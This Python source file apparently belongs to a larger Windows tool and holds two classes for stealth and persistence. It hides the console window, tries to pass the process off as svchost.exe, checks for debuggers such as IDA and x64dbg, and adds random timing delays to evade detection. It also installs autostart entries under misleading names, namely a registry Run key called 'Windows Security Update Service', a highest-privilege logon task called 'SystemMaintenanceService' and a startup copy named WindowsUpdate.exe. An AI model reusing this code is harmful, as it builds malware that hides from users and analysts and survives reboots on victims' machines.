import os
import sys
import subprocess
import winreg
import psutil
import time
import random
from pathlib import Path
import logging

class StealthManager:
    """Handles stealth operations and process hiding"""
    
    def __init__(self, config):
        self.config = config
        self.original_process_name = None
        
    def enable_stealth_mode(self):
        """Enable various stealth techniques"""
        try:
            # Hide console window on Windows
            if self.config.is_enabled('stealth.hide_window') and os.name == 'nt':
                self._hide_console_window()
            
            # Change process name (limited effectiveness but worth trying)
            if self.config.get('stealth.process_name'):
                self._change_process_name()
            
            # Reduce process priority to avoid detection
            self._reduce_process_priority()
            
        except Exception as e:
            logging.warning(f"Stealth mode error: {e}")
    
    def _hide_console_window(self):
        """Hide the console window on Windows"""
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            # Alternative method
            try:
                import win32gui
                import win32con
                window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(window, win32con.SW_HIDE)
            except Exception as e:
                logging.warning(f"Failed to hide window: {e}")
    
    def _change_process_name(self):
        """Attempt to change process name for basic obfuscation"""
        try:
            new_name = self.config.get('stealth.process_name', 'svchost.exe')
            
            # This is limited on most systems, but we can try
            if hasattr(os, 'environ'):
                os.environ['COMSPEC'] = new_name
            
            # Store original for cleanup
            self.original_process_name = sys.argv[0]
            
        except Exception as e:
            logging.warning(f"Failed to change process name: {e}")
    
    def _reduce_process_priority(self):
        """Reduce process priority to avoid detection"""
        try:
            current_process = psutil.Process()
            
            # Set to below normal priority
            if os.name == 'nt':
                current_process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            else:
                current_process.nice(10)  # Lower priority on Unix-like systems
                
        except Exception as e:
            logging.warning(f"Failed to reduce priority: {e}")
    
    def anti_debug_checks(self):
        """Basic anti-debugging checks"""
        try:
            # Check for common debugger processes
            debugger_processes = [
                'ollydbg.exe', 'ida.exe', 'ida64.exe', 'idaq.exe', 'idaq64.exe',
                'windbg.exe', 'x64dbg.exe', 'x32dbg.exe', 'immunity debugger.exe',
                'cheatengine.exe', 'processhacker.exe'
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in debugger_processes:
                        logging.warning("Potential debugger detected")
                        return True
                except:
                    continue
            
            # Check for debugging flags (Windows)
            if os.name == 'nt':
                try:
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    if kernel32.IsDebuggerPresent():
                        return True
                except:
                    pass
            
            return False
            
        except Exception as e:
            logging.warning(f"Anti-debug check error: {e}")
            return False
    
    def timing_evasion(self):
        """Implement timing-based evasion"""
        if self.config.is_enabled('anti_detection.randomize_timing'):
            min_delay = self.config.get('anti_detection.min_delay_seconds', 1)
            max_delay = self.config.get('anti_detection.max_delay_seconds', 5)
            delay = random.uniform(min_delay, max_delay)
            time.sleep(delay)

class PersistenceManager:
    """Handles persistence mechanisms"""
    
    def __init__(self, config):
        self.config = config
        
    def install_persistence(self):
        """Install persistence mechanisms"""
        try:
            current_executable = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            
            if self.config.is_enabled('persistence.registry_startup'):
                self._add_registry_startup(current_executable)
            
            if self.config.is_enabled('persistence.scheduled_task'):
                self._create_scheduled_task(current_executable)
            
            if self.config.is_enabled('persistence.startup_folder'):
                self._add_startup_folder(current_executable)
                
        except Exception as e:
            logging.warning(f"Persistence installation error: {e}")
    
    def _add_registry_startup(self, executable_path):
        """Add registry entry for startup"""
        try:
            if os.name != 'nt':
                return
            
            # Use a generic name to avoid suspicion
            key_name = "Windows Security Update Service"
            
            # HKEY_CURRENT_USER startup
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
            winreg.CloseKey(key)
            
            logging.info("Registry persistence installed")
            
        except Exception as e:
            logging.warning(f"Registry persistence failed: {e}")
    
    def _create_scheduled_task(self, executable_path):
        """Create a scheduled task for persistence"""
        try:
            if os.name != 'nt':
                return
            
            task_name = "SystemMaintenanceService"
            
            # Create scheduled task using schtasks command
            cmd = [
                'schtasks', '/create',
                '/tn', task_name,
                '/tr', executable_path,
                '/sc', 'onlogon',
                '/rl', 'highest',
                '/f'  # Force creation
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                logging.info("Scheduled task persistence installed")
            else:
                logging.warning(f"Scheduled task creation failed: {result.stderr}")
                
        except Exception as e:
            logging.warning(f"Scheduled task persistence failed: {e}")
    
    def _add_startup_folder(self, executable_path):
        """Add to startup folder"""
        try:
            if os.name != 'nt':
                return
            
            startup_folder = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            
            if startup_folder.exists():
                # Create a shortcut or copy the executable
                shortcut_path = startup_folder / 'WindowsUpdate.exe'
                
                # Simple copy approach (in production, you'd want to create a proper shortcut)
                import shutil
                shutil.copy2(executable_path, shortcut_path)
                
                logging.info("Startup folder persistence installed")
                
        except Exception as e:
            logging.warning(f"Startup folder persistence failed: {e}")
    
    def remove_persistence(self):
        """Remove persistence mechanisms"""
        try:
            if self.config.is_enabled('persistence.registry_startup'):
                self._remove_registry_startup()
            
            if self.config.is_enabled('persistence.scheduled_task'):
                self._remove_scheduled_task()
            
            if self.config.is_enabled('persistence.startup_folder'):
                self._remove_startup_folder()
                
        except Exception as e:
            logging.warning(f"Persistence removal error: {e}")
    
    def _remove_registry_startup(self):
        """Remove registry startup entry"""
        try:
            if os.name != 'nt':
                return
            
            key_name = "Windows Security Update Service"
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.DeleteValue(key, key_name)
            winreg.CloseKey(key)
            
        except Exception as e:
            logging.warning(f"Registry persistence removal failed: {e}")
    
    def _remove_scheduled_task(self):
        """Remove scheduled task"""
        try:
            if os.name != 'nt':
                return
            
            task_name = "SystemMaintenanceService"
            
            cmd = ['schtasks', '/delete', '/tn', task_name, '/f']
            subprocess.run(cmd, capture_output=True)
            
        except Exception as e:
            logging.warning(f"Scheduled task removal failed: {e}")
    
    def _remove_startup_folder(self):
        """Remove from startup folder"""
        try:
            if os.name != 'nt':
                return
            
            startup_folder = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            shortcut_path = startup_folder / 'WindowsUpdate.exe'
            
            if shortcut_path.exists():
                shortcut_path.unlink()
                
        except Exception as e:
            logging.warning(f"Startup folder removal failed: {e}")